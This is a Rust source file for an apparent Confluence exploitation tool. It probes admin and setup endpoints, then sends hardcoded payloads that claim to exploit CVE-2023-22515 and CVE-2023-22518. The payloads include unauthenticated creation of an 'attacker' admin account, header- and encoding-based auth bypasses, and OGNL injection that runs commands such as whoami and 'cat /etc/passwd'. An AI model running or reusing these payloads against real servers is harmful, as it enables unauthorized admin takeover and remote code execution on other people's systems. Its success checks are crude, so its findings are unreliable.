use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64, token: Option<&str>) -> Client {
    let mut builder = Client::builder()
        .timeout(Duration::from_secs(timeout))
        .redirect(reqwest::redirect::Policy::none());
    if let Some(t) = token {
        builder = builder.default_headers(reqwest::header::HeaderMap::from_iter([(
            reqwest::header::AUTHORIZATION,
            reqwest::header::HeaderValue::from_str(&format!("Bearer {}", t)).unwrap(),
        )]));
    }
    builder.build().unwrap_or_else(|_| Client::new())
}

const CONFLUENCE_ENDPOINTS: &[(&str, &str)] = &[
    ("Dashboard", "/dashboard.action"),
    ("Login", "/login.action"),
    ("Admin", "/admin/console.action"),
    ("Users", "/admin/users.action"),
    ("Groups", "/admin/groups.action"),
    ("Spaces", "/spaces/listdirectories.action"),
    ("API", "/rest/api/"),
    ("API space", "/rest/api/space"),
    ("API user", "/rest/api/user"),
    ("API group", "/rest/api/group"),
    ("API search", "/rest/api/search"),
    ("Server info", "/rest/api/serverInfo"),
    ("Setup", "/setup/setupstart.action"),
    ("Setup chooser", "/setup/choosesetup.action"),
    ("Bootstrap", "/bootstrap.action"),
    ("Noop", "/noop.action"),
    ("Export", "/admin/export.action"),
    ("Import", "/admin/import.action"),
    ("Mail", "/admin/mail.action"),
    ("Plugins", "/admin/plugins.action"),
];

const CVE_PAYLOADS: &[(&str, &str, &str)] = &[
    ("CVE-2023-22515 — create admin", "POST", "/setup/setupadministrator.action?token=bypass&username=attacker&password=Attacker123!&email=attacker@evil.com&fullName=Attacker"),
    ("CVE-2023-22515 — setup bypass", "GET", "/setup/setupstart.action?setup-select=true"),
    ("CVE-2023-22515 — chooser bypass", "GET", "/setup/choosesetup.action?setup-select=true"),
    ("CVE-2023-22515 — bootstrap", "GET", "/bootstrap.action"),
    ("CVE-2023-22518 — import zip", "POST", "/json/setupdataimport.action?token=bypass"),
    ("CVE-2023-22518 — upload zip", "POST", "/admin/restoreaction!upload.action?token=bypass"),
    ("CVE-2023-22518 — restore", "POST", "/admin/restoreaction!restore.action?token=bypass"),
    ("CVE-2023-22518 — import zip alt", "POST", "/json/setupdataimport.action"),
    ("CVE-2023-22515 — token bypass", "GET", "/setup/setupadministrator.action?token="),
    ("CVE-2023-22515 — admin list", "GET", "/setup/setupadministrator.action"),
    ("Auth bypass — X-Forwarded-For", "GET", "/admin/console.action"),
    ("Auth bypass — X-Original-URL", "GET", "/admin/users.action"),
    ("Auth bypass — path param", "GET", "/admin/users.action;jsessionid=fake"),
    ("Auth bypass — double encoding", "GET", "/%61dmin/console.action"),
    ("Auth bypass — semicolon", "GET", "/admin/console.action;"),
    ("RCE — OGNL inject", "GET", "/${@java.lang.Runtime@getRuntime().exec('whoami')}"),
    ("RCE — OGNL via param", "GET", "/pages/doenterpage.action?spaceKey=@java.lang.Runtime@getRuntime().exec('id')"),
    ("RCE — OGNL via title", "GET", "/pages/createpage.action?spaceKey=TEST&title=${@java.lang.Runtime@getRuntime().exec('env')}"),
    ("RCE — OGNL via label", "GET", "/pages/dolabel.action?label=${@java.lang.Runtime@getRuntime().exec('cat+/etc/passwd')}"),
    ("RCE — OGNL via attachment", "POST", "/pages/doattachfile.action?filename=${@java.lang.Runtime@getRuntime().exec('whoami')}"),
];

pub async fn rce(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} Confluence RCE Suite", "[*]".cyan().bold());
    println!("{} CVE-2023-22515 (admin creation) + CVE-2023-22518 (import RCE)", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {}", "[*]".cyan().bold(), url);
    println!("{} {} endpoints, {} exploit payloads", "[*]".cyan().bold(), CONFLUENCE_ENDPOINTS.len(), CVE_PAYLOADS.len());
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout, token);
    let base = url.trim_end_matches('/');

    println!("\n{} [1/2] Confluence endpoint discovery...", "[*]".cyan().bold());
    let mut found = Vec::new();
    let mut setup_exposed = false;
    for (name, path) in CONFLUENCE_ENDPOINTS {
        let full_url = format!("{}{}", base, path);
        match client.get(&full_url).send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let accessible = status == 200;
                let has_admin = body.contains("admin") || body.contains("Admin");
                let has_setup = body.contains("setup") || body.contains("Setup") || body.contains("bootstrap");
                let has_login = body.contains("login") || body.contains("password");
                let has_api = body.contains("rest") || body.contains("api");
                let tag = if accessible {
                    if has_setup { "SETUP EXPOSED".red().bold().to_string() }
                    else if has_admin { "ADMIN".red().bold().to_string() }
                    else if has_api { "API".green().bold().to_string() }
                    else if has_login { "LOGIN".yellow().to_string() }
                    else { "accessible".green().to_string() }
                } else if status == 401 || status == 403 {
                    "auth".yellow().to_string()
                } else if status == 404 {
                    "not found".dimmed().to_string()
                } else {
                    format!("status {}", status)
                };
                println!("  {} {:20} {:30} status={} {}", "*".cyan(), name, path, status, tag);
                if accessible {
                    found.push(*name);
                    if has_setup { setup_exposed = true; }
                }
            }
            Err(_) => {
                println!("  {} {:20} {:30} error", "*".red(), name, path);
            }
        }
    }

    println!("\n{} [2/2] CVE-2023-22515 + CVE-2023-22518 exploits...", "[*]".cyan().bold());
    let mut results = Vec::new();
    let mut admin_created = false;
    let mut import_rce = false;
    let mut ognl_rce = false;

    for (name, method, path) in CVE_PAYLOADS {
        let full_url = format!("{}{}", base, path);
        let mut req = if *method == "POST" {
            client.post(&full_url).header("Content-Type", "application/x-www-form-urlencoded")
        } else {
            client.get(&full_url)
        };

        if name.contains("X-Forwarded-For") {
            req = req.header("X-Forwarded-For", "127.0.0.1");
        } else if name.contains("X-Original-URL") {
            req = req.header("X-Original-URL", "/admin/users.action");
        }

        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let body = resp.text().await.unwrap_or_default();
                let has_admin_form = body.contains("username") && body.contains("password");
                let has_success = body.contains("success") || body.contains("created") || body.contains("complete");
                let has_rce = body.contains("root") || body.contains("uid=") || body.contains("admin:")
                    || body.contains("whoami") || body.contains("evil.com");
                let has_error = body.contains("error") || body.contains("invalid") || body.contains("denied");
                let is_22515 = name.contains("22515");
                let is_22518 = name.contains("22518");
                let is_ognl = name.contains("OGNL");

                let tag = if has_rce {
                    "RCE".red().bold().to_string()
                } else if has_success && is_22515 {
                    "ADMIN CREATED".red().bold().to_string()
                } else if has_success && is_22518 {
                    "IMPORT OK".red().bold().to_string()
                } else if has_admin_form && is_22515 {
                    "SETUP FORM".red().to_string()
                } else if has_error || status == 401 || status == 403 {
                    "blocked".green().to_string()
                } else if status == 404 {
                    "not found".dimmed().to_string()
                } else {
                    format!("status {}", status)
                };

                println!(
                    "  {} [{:02}] {:45} status={} {}",
                    "*".cyan(),
                    results.len() + 1,
                    name,
                    status,
                    tag
                );

                if has_rce || (has_success && (is_22515 || is_22518)) || (has_admin_form && is_22515) {
                    if is_22515 { admin_created = true; }
                    if is_22518 { import_rce = true; }
                    if is_ognl { ognl_rce = true; }
                    println!("    {} {}", ">".red().bold(), body.chars().take(200).collect::<String>());
                    results.push(*name);
                }
            }
            Err(_) => {
                println!("  {} [{:02}] {:45} error", "*".red(), results.len() + 1, name);
            }
        }
    }

    println!(
        "\n{} {} endpoints found, {} / {} exploits succeeded",
        "[*]".cyan().bold(),
        found.len(),
        results.len(),
        CVE_PAYLOADS.len()
    );

    if setup_exposed {
        println!("{} [CRITICAL] Setup/bootstrap endpoints exposed — unauthenticated access to admin creation!", "[!]".red().bold());
    }
    if admin_created {
        println!("{} [CRITICAL] CVE-2023-22515 — admin account creation successful!", "[!]".red().bold());
    }
    if import_rce {
        println!("{} [CRITICAL] CVE-2023-22518 — malicious zip import RCE!", "[!]".red().bold());
    }
    if ognl_rce {
        println!("{} [CRITICAL] OGNL injection — remote code execution!", "[!]".red().bold());
    }
    if results.is_empty() && !setup_exposed {
        println!("{} No Confluence vulnerabilities detected.", "[-]".green().bold());
    }

    Ok(())
}
